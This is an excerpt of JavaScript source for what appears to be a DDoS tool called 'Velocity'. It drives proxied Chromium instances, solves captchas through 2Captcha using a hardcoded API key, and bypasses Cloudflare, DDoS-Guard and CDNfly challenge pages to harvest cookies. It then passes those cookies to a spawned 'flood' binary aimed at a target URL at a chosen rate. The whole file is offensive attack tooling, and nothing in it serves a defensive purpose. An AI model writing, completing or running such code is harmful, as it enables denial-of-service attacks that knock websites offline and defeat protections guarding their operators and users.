...
/* 
    ...
    * Requires download to '/addons' folder for correct use.
    * See documentation for more information.
*/

const addons = {
    cloudflare: './engine/cloudflare.js',
    ddosguard: './engine/ddosguard.js',
    cdnfly: './engine/cdnfly.js',
    react: './engine/react.js',
};
        ...
        if (addons.hasOwnProperty(addonName)) {
            try {
                ...
                if (typeof addon.initialize === 'function') {
                    ...
                    log(`(${'ADDONS'.red}) Incorrect addon -> ` + `${addonName}`.red);
                }
            } catch (error) {
                log(`(${'ADDONS'.red}) Unable to load addon -> ` + `${addonName}`.red + ` | ` + `${error.message}`.red);
            }
            totalCount++;
        }
    }
    log(`(${'ADDONS'.magenta}) Correctly loaded ${`${loadedCount}`.magenta}/${`${totalCount}`.magenta} addons. `);
}
...
if (debugT === true) {
    log(`(${'WARNING'.bgYellow.black}) You have run the script in debug mode.`);
...
async function flooder(proxy, headerEntries, cookies, userAgent) {
    //var starts = spawn("./tls", [urlT, userAgent, timeT, cookies, 'GET', 500, proxy]);
    const fArgs = [
        '-p', proxy,
        '-u', urlT,
        '-r', rateT,
    ...
    var starts = spawn('./flood', fArgs, { stdio: 'inherit', detached: false });
...
async function solver(proxy) {
    log(`(${'Velocity'.brightBlue}) New browser instance -> ` + `Chromium (${proxy})`.brightBlue)
    ...
    const captchaoptions = {
        ...
        provider: {
            id: '2captcha',
            token: 'e434221e110a2c6795a5ea0b0b37b475',      // Here you need to paste your key from 2Captcha
        },
    }
    ...
    try {
        if (![200, 404].includes(status)) {
            ...
            if (title === 'Just a moment...') {
                ...
                log(`(${'Velocity'.magenta}) Browser got Title -> ` + `${(receivedTitle !== "") ? receivedTitle : "[ ] Title is empty"}`.magenta);
                log(`(${'Velocity'.magenta}) Browser got Cookies -> ` + `${(receivedCookies !== "") ? receivedCookies : "[ ] Cookies is empty"}`.magenta);

                // Starting a new instance of the flooder
                flooder(proxy, receivedHeaderEntries, receivedCookies, userAgent);
            ...
            } else if (await content.includes('/.well-known/ddos-guard/check?context=free_splash')) {
                ...
                log(`(${'Velocity'.green}) No Detect protection ` + `(JS/Captcha)`.green);
                ...
                log(`(${'Velocity'.magenta}) Browser got Title -> ` + `${(title !== "") ? title : "[ ] Title is empty"}`.magenta);
                log(`(${'Velocity'.magenta}) Browser got Cookies -> ` + `${(cookies !== "") ? cookies : "[ ] Cookies is empty"}`.magenta);

                // Starting a new instance of the flooder
                flooder(proxy, headerEntries, cookies, userAgent);
        ...
        } else if (await page.locator('script[src="/_guard/html.js?js=slider_html"]').count() > 0) {
            await page.waitForTimeout(1000);
